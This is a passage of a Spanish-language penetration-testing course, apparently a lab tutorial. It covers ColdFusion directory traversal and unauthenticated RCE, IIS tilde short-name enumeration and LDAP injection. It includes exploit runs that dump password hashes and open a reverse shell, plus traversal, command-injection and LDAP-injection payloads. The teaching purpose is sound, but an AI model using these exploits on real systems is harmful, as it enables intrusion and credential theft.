Con esta vulnerabilidad, los atacantes pueden acceder a archivos fuera del directorio previsto incluyendo `../` secuencias en el parámetro de archivo. Por ejemplo, considere la siguiente URL:

Código: http

```http
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
```

En este ejemplo, la URL intenta acceder al `mappings.cfm` archivo en el `/CFIDE/administrator/settings/` directorio de la aplicación web con un `en` local. Sin embargo, un ataque de salto de directorio se puede ejecutar manipulando el parámetro de configuración regional de la URL, lo que permite a un atacante leer archivos arbitrarios ubicados fuera del directorio previsto, como archivos de configuración o archivos del sistema.

Código: http

```http
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

En este ejemplo, el `../` las secuencias se han utilizado para reemplazar un válido `locale` para atravesar la estructura de directorios y acceder al `passwd` archivo ubicado en el `/etc/` directorio.

Usando `searchsploit`, copie el exploit en un directorio de trabajo y luego ejecute el archivo para ver qué argumentos requiere.

  Atacar a ColdFusion

```shell-session
vcrdcr@htb[/htb]$ searchsploit -p 14641

  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable

Copied EDB-ID #14641's path to the clipboard
```

#### Coldfusion - Explotación

  Atacar a ColdFusion

```shell-session
vcrdcr@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
vcrdcr@htb[/htb]$ python2 14641.py 

usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed
```

El `password.properties` file en ColdFusion es un archivo de configuración que almacena de forma segura contraseñas cifradas para diversos servicios y recursos que utiliza el servidor de ColdFusion. Contiene una lista de pares clave-valor, donde la clave representa el nombre del recurso y el valor es la contraseña cifrada. Estas contraseñas cifradas se utilizan para servicios como `database connections`, `mail servers`, `LDAP servers`, y otros recursos que requieren autenticación. Al almacenar contraseñas cifradas en este archivo, ColdFusion puede recuperarlas automáticamente y usarlas para autenticarse con los servicios respectivos sin requerir la entrada manual de contraseñas cada vez. El archivo suele estar en el `[cf_root]/lib` directorio y se puede administrar a través del Administrador de ColdFusion.

Al proporcionar los parámetros correctos al script exploit y especificar la ruta del archivo deseado, el script puede activar un exploit en los puntos finales vulnerables mencionados anteriormente. El script emitirá el resultado del intento de explotación:

#### Coldfusion - Explotación

  Atacar a ColdFusion

```shell-session
vcrdcr@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...
```

Como podemos ver, el contenido de la `password.properties` se han recuperado archivos, lo que demuestra que este objetivo es vulnerable a `CVE-2010-2861`.

---

## RCE no autenticado

Ejecución Remota de Código No Autenticada (`RCE`) es un tipo de vulnerabilidad de seguridad que permite a un atacante `execute arbitrary code` en un sistema vulnerable `without requiring authentication`. Este tipo de vulnerabilidad puede tener graves consecuencias, como lo hará `enable an attacker to take complete control of the system` y potencialmente robar datos confidenciales o causar daños al sistema.

La diferencia entre a `RCE` y un `Unauthenticated Remote Code Execution` es si un atacante necesita o no proporcionar credenciales de autenticación válidas para explotar la vulnerabilidad. Una vulnerabilidad RCE permite a un atacante ejecutar código arbitrario en un sistema de destino, independientemente de si tiene o no credenciales válidas. Sin embargo, en muchos casos, las vulnerabilidades de RCE requieren que el atacante ya tenga acceso a alguna parte del sistema, ya sea a través de una cuenta de usuario u otros medios.

Por el contrario, una vulnerabilidad RCE no autenticada permite a un atacante ejecutar código arbitrario en un sistema de destino sin credenciales de autenticación válidas. Esto hace que este tipo de vulnerabilidad sea particularmente peligroso, ya que un atacante puede hacerse cargo de un sistema o ejecutar comandos maliciosos sin ninguna barrera de entrada.

En el contexto de las aplicaciones web de ColdFusion, se produce un ataque RCE no autenticado cuando un atacante puede ejecutar código arbitrario en el servidor sin necesidad de autenticación. Esto puede suceder cuando una aplicación web permite la ejecución de código arbitrario a través de una función o función que no requiere autenticación, como una consola de depuración o una funcionalidad de carga de archivos. Toma el siguiente código:

Código: html

```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

En el código anterior, el `cmd` la variable se crea concatenando el `cgi.query_string` variable con un comando a ejecutar. Este comando se ejecuta entonces usando el `cfexecute` función, que ejecuta Windows `cmd.exe` programa con los argumentos especificados. Este código es vulnerable a un ataque RCE no autenticado porque no valida correctamente el `cmd` variable antes de ejecutarlo, ni requiere que el usuario sea autenticado. Un atacante podría simplemente pasar un comando malicioso como el `cgi.query_string` variable, y sería ejecutado por el servidor.

Código: http

```http
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

Esta URL incluye un punto y coma (`%3B`) al comienzo de la cadena de consulta, que puede permitir la ejecución de múltiples comandos en el servidor. Esto podría agregar una funcionalidad legítima con un comando no deseado. El incluido `echo` el comando imprime un mensaje en la consola y es seguido por un comando de redirección para escribir un archivo en la consola `C:` directorio con un mensaje que indica que el servidor ha sido comprometido.

Un ejemplo de un ataque RCE no autenticado de ColdFusion es el `CVE-2009-2265` vulnerabilidad que afectó a Adobe ColdFusion versiones 8.0.1 y anteriores. Este exploit permitió a los usuarios no autenticados cargar archivos y obtener la ejecución remota de código en el host de destino. La vulnerabilidad existe en el paquete FCKeditor, y es accesible en la siguiente ruta:

Código: http

```http
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

`CVE-2009-2265` es la vulnerabilidad identificada por nuestra búsqueda anterior de searchsploit como `Adobe ColdFusion 8 - Remote Command Execution (RCE)`. Llévalo a un directorio de trabajo.

#### Buscarsploit

  Atacar a ColdFusion

```shell-session
vcrdcr@htb[/htb]$ searchsploit -p 50057

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID #50057's path to the clipboard
```

  Atacar a ColdFusion

```shell-session
vcrdcr@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Un rápido `cat` la revisión del código indica que el script necesita alguna información. Establezca la información correcta y inicie el exploit.

#### Explotar Modificación

Código: pitón

```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

El exploit tardará un poco de tiempo en lanzarse, pero eventualmente devolverá un shell remoto funcional

#### Explotación

  Atacar a ColdFusion

```shell-session
vcrdcr@htb[/htb]$ python3 50057.py 

Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Priting request...
Content-type: multipart/form-data; boundary=77c732cb2f394ea79c71d42d50274368
Content-length: 1698

--77c732cb2f394ea79c71d42d50274368

<SNIP>

--77c732cb2f394ea79c71d42d50274368--


Sending request and printing response...


		<script type="text/javascript">
			window.parent.OnUploadCompleted( 0, "/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/1269fd7bd2b341fab6751ec31bbfb610.txt", "1269fd7bd2b341fab6751ec31bbfb610.txt", "0" );
		</script>
	

Printing some information for debugging...
lhost: 10.10.14.55
lport: 4444
rhost: 10.129.247.30
rport: 8500
payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.247.30.
Ncat: Connection from 10.129.247.30:49866.
```

#### Shell Inverso

  Atacar a ColdFusion

```cmd-session
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\ColdFusion8\runtime\bin

22/03/2017  08:53 ��    <DIR>          .
22/03/2017  08:53 ��    <DIR>          ..
18/03/2008  11:11 ��            64.512 java2wsdl.exe
19/01/2008  09:59 ��         2.629.632 jikes.exe
18/03/2008  11:11 ��            64.512 jrun.exe
18/03/2008  11:11 ��            71.680 jrunsvc.exe
18/03/2008  11:11 ��             5.120 jrunsvcmsg.dll
18/03/2008  11:11 ��            64.512 jspc.exe
22/03/2017  08:53 ��             1.804 jvm.config
18/03/2008  11:11 ��            64.512 migrate.exe
18/03/2008  11:11 ��            34.816 portscan.dll
18/03/2008  11:11 ��            64.512 sniffer.exe
18/03/2008  11:11 ��            78.848 WindowsLogin.dll
18/03/2008  11:11 ��            64.512 wsconfig.exe
22/03/2017  08:53 ��             1.013 wsconfig_jvm.config
18/03/2008  11:11 ��            64.512 wsdl2java.exe
18/03/2008  11:11 ��            64.512 xmlscript.exe
              15 File(s)      3.339.009 bytes
               2 Dir(s)   1.432.776.704 bytes free
```


# IIS Tilde Enumeración

---

La enumeración de directorios IIS tilde es una técnica utilizada para descubrir archivos ocultos, directorios y nombres de archivos cortos (también conocido como `8.3 format`) en algunas versiones de los servidores web de Microsoft Internet Information Services (IIS). Este método aprovecha una vulnerabilidad específica en IIS, como resultado de cómo gestiona los nombres de archivos cortos dentro de sus directorios.

Cuando se crea un archivo o carpeta en un servidor IIS, Windows genera un nombre de archivo corto en el servidor `8.3 format`, que consta de ocho caracteres para el nombre del archivo, un período y tres caracteres para la extensión. Curiosamente, estos nombres de archivos cortos pueden otorgar acceso a sus archivos y carpetas correspondientes, incluso si estaban destinados a estar ocultos o inaccesibles.

La tilde (`~`) carácter, seguido de un número de secuencia, significa un nombre de archivo corto en una URL. Por lo tanto, si alguien determina el nombre de archivo corto de un archivo o carpeta, puede explotar el carácter tilde y el nombre de archivo corto en la URL para acceder a datos confidenciales u recursos ocultos.

La enumeración de directorios IIS tilde implica principalmente el envío de solicitudes HTTP al servidor con distintas combinaciones de caracteres en la URL para identificar nombres de archivos cortos válidos. Una vez que se detecta un nombre de archivo corto válido, esta información se puede utilizar para acceder al recurso relevante o enumerar la estructura del directorio.

El proceso de enumeración comienza enviando solicitudes con varios caracteres siguiendo la tilde:

Código: http

```http
http://example.com/~a
http://example.com/~b
http://example.com/~c
...
```

Supongamos que el servidor contiene un directorio oculto llamado SecretDocuments. Cuando se envía una solicitud a `http://example.com/~s`, el servidor responde con un `200 OK` código de estado, que revela un directorio con un nombre corto que comienza con "s". El proceso de enumeración continúa agregando más caracteres:

Código: http

```http
http://example.com/~se
http://example.com/~sf
http://example.com/~sg
...
```

Para la solicitud `http://example.com/~se`, el servidor devuelve a `200 OK` código de estado, refinando aún más el nombre corto a "se". Se envían solicitudes adicionales, tales como:

Código: http

```http
http://example.com/~sec
http://example.com/~sed
http://example.com/~see
...
```

El servidor entrega un `200 OK` código de estado para la solicitud `http://example.com/~sec`, estrechando aún más el nombre corto a "seg".

Continuando con este procedimiento, el nombre corto `secret~1` finalmente se descubre cuando el servidor devuelve un `200 OK` código de estado para la solicitud `http://example.com/~secret`.

Una vez que el nombre corto `secret~1` se identifica, se puede realizar una enumeración de nombres de archivos específicos dentro de esa ruta, lo que podría exponer documentos confidenciales.

Por ejemplo, si el nombre corto `secret~1` se determina para el directorio oculto SecretDocuments, se puede acceder a los archivos de ese directorio enviando solicitudes como:

Código: http

```http
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
```

La misma técnica de enumeración de directorios IIS tilde también puede detectar nombres de archivos cortos 8.3 para archivos dentro del directorio. Después de obtener los nombres cortos, se puede acceder directamente a esos archivos utilizando los nombres cortos en las solicitudes.

Código: http

```http
http://example.com/secret~1/somefi~1.txt
```

En nombres de archivo cortos 8.3, como `somefi~1.txt`, el número "1" es un identificador único que distingue archivos con nombres similares dentro del mismo directorio. Los números que siguen a la tilde (`~`) ayudar al sistema de archivos a diferenciar entre archivos que comparten similitudes en sus nombres, asegurando que cada archivo tenga un nombre de archivo corto 8.3 distinto.

Por ejemplo, si dos archivos nombrados `somefile.txt` y `somefile1.txt` existen en el mismo directorio, sus nombres de archivo cortos 8.3 serían:

- `somefi~1.txt`para `somefile.txt`
- `somefi~2.txt`para `somefile1.txt`

---

## Enumeración

La fase inicial implica mapear el objetivo y determinar qué servicios están operando en sus respectivos puertos.

#### Nmap - Puertos abiertos

  IIS Tilde Enumeración

```shell-session
vcrdcr@htb[/htb]$ nmap -p- -sV -sC --open 10.129.224.91

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-14 19:44 GMT
Nmap scan report for 10.129.224.91
Host is up (0.011s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds

```

IIS 7.5 se ejecuta en el puerto 80. Ejecutar un ataque de enumeración de tilde en esta versión podría ser una opción viable.

#### Tilde Enumeración usando IIS ShortName Scanner

El envío manual de solicitudes HTTP para cada letra del alfabeto puede ser un proceso tedioso. Afortunadamente, hay una herramienta llamada `IIS-ShortName-Scanner` eso puede automatizar esta tarea. Puedes encontrarlo en GitHub en el siguiente enlace: [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner). Para usar `IIS-ShortName-Scanner`, deberá instalar Oracle Java en Pwnbox o en su VM local. Los detalles se pueden encontrar en el siguiente enlace. [Cómo instalar Oracle Java](https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/)

Cuando ejecute el siguiente comando, le pedirá un proxy, simplemente presione enter para No.

  IIS Tilde Enumeración

```shell-session
vcrdcr@htb[/htb]$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

Al ejecutar la herramienta, descubre 2 directorios y 3 archivos. Sin embargo, el objetivo no permite `GET` acceso a `http://10.129.204.231/TRANSF~1.ASP`, requiriendo la fuerza bruta del nombre de archivo restante.

#### Generar Lista de palabras

La imagen pwnbox ofrece una extensa colección de listas de palabras ubicadas en el `/usr/share/wordlists/` directorio, que se puede utilizar para este propósito.

  IIS Tilde Enumeración

```shell-session
vcrdcr@htb[/htb]$ egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

Este comando combina `egrep` y `sed` para filtrar y modificar el contenido de los archivos de entrada, guarde los resultados en un nuevo archivo.

|**Parte de Comando**|**Descripción**|
|---|---|
|`egrep -r ^transf`|El `egrep` el comando se utiliza para buscar líneas que contienen un patrón específico en los archivos de entrada. El `-r` flag indica una búsqueda recursiva a través de directorios. El `^transf` el patrón coincide con cualquier línea que comience con "transf". La salida de este comando serán líneas que comienzan con "transf" junto con sus nombres de archivo de origen.|
|`\|`|El símbolo de la tubería (`\|`) se utiliza para pasar la salida del primer comando (`egrep`) al segundo comando (`sed`). En este caso, las líneas que comienzan con "transf" y sus nombres de archivo serán la entrada para el `sed` comando.|
|`sed 's/^[^:]*://'`|El `sed` el comando se utiliza para realizar una operación de buscar y reemplazar en su entrada (en este caso, la salida de `egrep`). El `'s/^[^:]*://'` la expresión dice `sed` para encontrar cualquier secuencia de caracteres al comienzo de una línea (`^`) hasta el primer colon (`:`), y reemplazarlos con nada (eliminando efectivamente el texto coincidente). El resultado serán las líneas que comienzan con "transf" pero sin los nombres de archivo y los dos puntos.|
|`> /tmp/list.txt`|El símbolo mayor que (`>`) se utiliza para redirigir la salida de todo el comando (es decir, las líneas modificadas) a un nuevo archivo llamado `/tmp/list.txt`.|

#### Gobuster Enumeración

Una vez que haya creado la lista de palabras personalizada, puede usar `gobuster` para enumerar todos los elementos en el objetivo. GoBuster es una herramienta de fuerza bruta de directorio y archivo de código abierto escrita en el lenguaje de programación Go. Está diseñado para probadores de penetración y profesionales de seguridad para ayudar a identificar y descubrir archivos ocultos, directorios o recursos en servidores web durante las evaluaciones de seguridad.

  IIS Tilde Enumeración

```shell-session
vcrdcr@htb[/htb]$ gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/23 15:14:05 Starting gobuster in directory enumeration mode
===============================================================
/transf**.aspx        (Status: 200) [Size: 941]
Progress: 306 / 309 (99.03%)
===============================================================
2023/03/23 15:14:11 Finished
===============================================================
```

Desde la salida redactada, puede ver eso `gobuster` ha identificado con éxito un `.aspx` archivo como el nombre de archivo completo correspondiente al nombre corto descubierto anteriormente `TRANSF~1.ASP`.


# LDAP

---

`LDAP` (Lightweight Directory Access Protocol) es `a protocol` usado para `access and manage directory information`. A `directory` es a `hierarchical data store` que contiene información sobre recursos de red como `users`, `groups`, `computers`, `printers`, y otros dispositivos. LDAP proporciona una excelente funcionalidad:

|**Funcionalidad**|**Descripción**|
|---|---|
|`Efficient`|Consultas y conexiones eficientes y rápidas a servicios de directorio, gracias a su lenguaje de consulta lean y almacenamiento de datos no normalizado.|
|`Global naming model`|Admite múltiples directorios independientes con un modelo de nomenclatura global que garantiza entradas únicas.|
|`Extensible and flexible`|Esto ayuda a cumplir con los requisitos futuros y locales al permitir atributos y esquemas personalizados.|
|`Compatibility`|Es compatible con muchos productos y plataformas de software, ya que se ejecuta directamente sobre TCP/IP y SSL, y lo es `platform-independent`, adecuado para su uso en entornos heterogéneos con diversos sistemas operativos.|
|`Authentication`|Proporciona `authentication` mecanismos que permiten a los usuarios `sign on once` y acceda a múltiples recursos en el servidor de forma segura.|

Sin embargo, también sufre algunos problemas importantes:

|Funcionalidad|Descripción|
|---|---|
|`Compliance`|Servidores de directorio `must be LDAP compliant` para que se implemente el servicio, que puede `limit the choice` de vendedores y productos.|
|`Complexity`|`Difficult to use and understand`para muchos desarrolladores y administradores, que pueden no saber cómo configurar los clientes LDAP correctamente o usarlo de forma segura.|
|`Encryption`|LDAP `does not encrypt its traffic by default`, que expone datos sensibles a posibles escuchas y manipulaciones. LDAPS (LDAP sobre SSL) o StartTLS deben utilizarse para habilitar el cifrado.|
|`Injection`|`Vulnerable to LDAP injection attacks`, donde los usuarios maliciosos pueden manipular consultas LDAP y `gain unauthorised access` a datos o recursos. Para evitar tales ataques, se deben implementar la validación de entrada y la codificación de salida.|

LDAP es `commonly used` para proporcionar un `central location` para `accessing` y `managing` servicios de directorio. Los servicios de directorio son colecciones de información sobre la organización, sus usuarios y activos, como nombres de usuario y contraseñas. LDAP permite a las organizaciones almacenar, administrar y proteger esta información de forma estandarizada. Aquí hay algunos casos de uso comunes:

|**Caso de Uso**|**Descripción**|
|---|---|
|`Authentication`|LDAP se puede utilizar para `central authentication`, permitiendo a los usuarios tener credenciales de inicio de sesión únicas en múltiples aplicaciones y sistemas. Este es uno de los casos de uso más comunes para LDAP.|
|`Authorisation`|LDAP puede `manage permissions` y `access control` para recursos de red como carpetas o archivos en un recurso compartido de red. Sin embargo, esto puede requerir una configuración o integración adicional con protocolos como Kerberos.|
|`Directory Services`|LDAP proporciona una manera de `search`, `retrieve`, y `modify data` almacenado en un directorio, lo que lo hace útil para administrar un gran número de usuarios y dispositivos en una red corporativa. `LDAP is based on the X.500 standard` para servicios de directorio.|
|`Synchronisation`|LDAP se puede utilizar para `keep data consistent` a través de múltiples sistemas por `replicating changes` hecho en un directorio a otro.|

Hay dos implementaciones populares de LDAP: `OpenLDAP`un software de código abierto ampliamente utilizado y compatible, y `Microsoft Active Directory`, una implementación basada en Windows que se integra perfectamente con otros productos y servicios de Microsoft.

Aunque LDAP y AD son `related`, ellos `serve different purposes`. `LDAP` es a `protocol` eso especifica el método de acceso y modificación de los servicios de directorio, mientras que `AD` es a `directory service` que almacena y gestiona datos de usuarios e informáticos. Si bien LDAP puede comunicarse con AD y otros servicios de directorio, no es un servicio de directorio en sí. AD ofrece funcionalidades adicionales como administración de políticas, inicio de sesión único e integración con varios productos de Microsoft.

|**LDAP**|**Directorio Activo (AD)**|
|---|---|
|A `protocol` eso define cómo los clientes y servidores se comunican entre sí para acceder y manipular los datos almacenados en un servicio de directorio.|A `directory server` que utiliza LDAP como uno de sus protocolos para proporcionar autenticación, autorización y otros servicios para redes basadas en Windows.|
|An `open and cross-platform protocol` que se puede utilizar con diferentes tipos de servidores de directorios y aplicaciones.|`Proprietary software`eso solo funciona con sistemas basados en Windows y requiere componentes adicionales como DNS (Domain Name System) y Kerberos para su funcionalidad.|
|Tiene un `flexible and extensible schema` eso permite que los administradores o desarrolladores definan atributos personalizados y clases de objetos.|Tiene un `predefined schema` esto sigue y amplía el estándar X.500 con clases de objetos adicionales y atributos específicos para entornos de Windows. Las modificaciones deben hacerse con precaución y cuidado.|
|Soporta `multiple authentication mechanisms` tales como enlace simple, SASL, etc.|Es compatible `Kerberos` como su mecanismo de autenticación principal, pero también es compatible con NTLM (NT LAN Manager) y LDAP sobre SSL/TLS para compatibilidad con versiones anteriores.|

LDAP funciona utilizando un `client-server architecture`. Un cliente envía una solicitud LDAP a un servidor, que busca en el servicio de directorio y devuelve una respuesta al cliente. LDAP es un protocolo que es más simple y más eficiente que X.500, en el que se basa. Utiliza un modelo cliente-servidor, donde los clientes envían solicitudes a servidores utilizando mensajes LDAP codificados en ASN.1 (Abstract Syntax Notation One) y transmitidos a través de TCP/IP (Transmission Control Protocol/Internet Protocol). Los servidores procesan las solicitudes y envían respuestas utilizando el mismo formato. LDAP admite varias solicitudes, como `bind`, `unbind`, `search`, `compare`, `add`, `delete`, `modify`, etc.

`LDAP requests` son `messages` que los clientes envían a los servidores a `perform operations` sobre los datos almacenados en un servicio de directorio. Una solicitud LDAP se compone de varios componentes:

1. `Session connection`: El cliente se conecta al servidor a través de un puerto LDAP (generalmente 389 o 636).
2. `Request type`: El cliente especifica la operación que desea realizar, como `bind`, `search`, etc.
3. `Request parameters`: El cliente proporciona información adicional para la solicitud, como el `distinguished name` (DN) de la entrada a acceder o modificar, el alcance y filtro de la consulta de búsqueda, los atributos y valores a añadir o cambiar, etc.
4. `Request ID`: El cliente asigna un identificador único para cada solicitud para que coincida con la respuesta correspondiente del servidor.

Una vez que el servidor recibe la solicitud, la procesa y devuelve un mensaje de respuesta que incluye varios componentes:

1. `Response type`: El servidor indica la operación que se realizó en respuesta a la solicitud.
2. `Result code`: El servidor indica si la operación fue exitosa o no y por qué.
3. `Matched DN:`Si corresponde, el servidor devuelve el DN de la entrada existente más cercana que coincida con la solicitud.
4. `Referral`: El servidor devuelve una URL de otro servidor que puede tener más información sobre la solicitud, si corresponde.
5. `Response data`: El servidor devuelve cualquier dato adicional relacionado con la respuesta, como los atributos y valores de una entrada que se buscó o modificó.

Después de recibir y procesar la respuesta, el cliente se desconecta del puerto LDAP.

#### ldapsearch

Por ejemplo, `ldapsearch` es una utilidad de línea de comandos utilizada para buscar información almacenada en un directorio utilizando el protocolo LDAP. Se usa comúnmente para consultar y recuperar datos de un servicio de directorio LDAP.

  LDAP

```shell-session
vcrdcr@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"

```

Este comando se puede desglosar de la siguiente manera:

- Conéctese al servidor `ldap.example.com` en puerto `389`.
- Bind (autenticar) como `cn=admin,dc=example,dc=com` con contraseña `secret123`.
- Buscar bajo la base DN `ou=people,dc=example,dc=com`.
- Usa el filtro `(mail=john.doe@example.com)` para encontrar entradas que tengan esta dirección de correo electrónico.

El servidor procesaría la solicitud y enviaría una respuesta, que podría verse así:

Código: ldap

```ldap
dn: uid=jdoe,ou=people,dc=example,dc=com
objectClass: inetOrgPerson
objectClass: organizationalPerson
objectClass: person
objectClass: top
cn: John Doe
sn: Doe
uid: jdoe
mail: john.doe@example.com

result: 0 Success
```

Esta respuesta incluye las entradas `distinguished name (DN)` eso coincide con los criterios de búsqueda y sus atributos y valores.

---

## LDAP Inyección

`LDAP injection` es un ataque que `exploits web applications that use LDAP` (Lightweight Directory Access Protocol) para la autenticación o el almacenamiento de información del usuario. El atacante puede `inject malicious code` o `characters` en consultas LDAP para alterar el comportamiento de la aplicación, `bypass security measures`, y `access sensitive data` almacenado en el directorio LDAP.

Para probar la inyección LDAP, puede usar valores de entrada que contengan `special characters or operators` eso puede cambiar el significado de la consulta:

|Entrada|Descripción|
|---|---|
|`*`|Un asterisco `*` puede `match any number of characters`.|
|`( )`|Paréntesis `( )` puede `group expressions`.|
|`\|`|Una barra vertical `\|` puede realizar `logical OR`.|
|`&`|Un ampersand `&` puede realizar `logical AND`.|
|`(cn=*)`|Valores de entrada que intentan eludir las comprobaciones de autenticación o autorización inyectando condiciones que `always evaluate to true` se puede utilizar. Por ejemplo, `(cn=*)` o `(objectClass=*)` se puede utilizar como valores de entrada para campos de nombre de usuario o contraseña.|

Los ataques de inyección LDAP son `similar to SQL injection attacks` pero diríjase al servicio de directorio LDAP en lugar de a una base de datos.

Por ejemplo, supongamos que una aplicación utiliza la siguiente consulta LDAP para autenticar usuarios:

Código: php

```php
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

En esta consulta, `$username` y `$password` contiene las credenciales de inicio de sesión del usuario. Un atacante podría inyectar el `*` personaje en el `$username` o `$password` campo para modificar la consulta LDAP y omitir la autenticación.

Si un atacante inyecta el `*` personaje en el `$username` campo, la consulta LDAP coincidirá con cualquier cuenta de usuario con cualquier contraseña. Esto permitiría al atacante obtener acceso a la aplicación con cualquier contraseña, como se muestra a continuación:

Código: php

```php
$username = "*";
$password = "dummy";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

Alternativamente, si un atacante inyecta el `*` personaje en el `$password` campo, la consulta LDAP coincidiría con cualquier cuenta de usuario con cualquier contraseña que contenga la cadena inyectada. Esto permitiría al atacante obtener acceso a la aplicación con cualquier nombre de usuario, como se muestra a continuación:

Código: php

```php
$username = "dummy";
$password = "*";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

Los ataques de inyección de LDAP pueden conducir a `severe consequences`, como `unauthorised access` a información sensible, `elevated privileges`, e incluso `full control over the affected application or server`. Estos ataques también pueden afectar considerablemente la integridad y disponibilidad de los datos, ya que los atacantes pueden `alter or remove data` dentro del servicio de directorio, causando interrupciones en las aplicaciones y servicios que dependen de esos datos.

Para mitigar los riesgos asociados con los ataques de inyección LDAP, es crucial `thoroughly validate` y `sanitize user input` antes de incorporarlo a las consultas LDAP. Este proceso debe implicar `removing LDAP-specific special characters` como `*` y `employing parameterised queries` para garantizar que la entrada del usuario es `treated solely as data`, no código ejecutable.

---

## Enumeración

Enumerar el objetivo nos ayuda a comprender los servicios y los puertos expuestos. An `nmap` el escaneo de servicios es un tipo de técnica de escaneo de red utilizada para identificar y analizar los servicios que se ejecutan en un sistema o red de destino. Al sondear los puertos abiertos y evaluar las respuestas, nmap puede deducir qué servicios están activos y sus respectivas versiones. El escaneo proporciona información valiosa sobre la infraestructura de red del objetivo y las posibles vulnerabilidades y superficies de ataque.

#### mapa

  LDAP

```shell-session
vcrdcr@htb[/htb]$ nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 14:43 SAST
Nmap scan report for 10.129.204.229
Host is up (0.18s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.73 seconds

```

nmap detecta un `http` servidor que se ejecuta en puerto `80` y un `ldap` servidor que se ejecuta en puerto `389`

#### Inyección

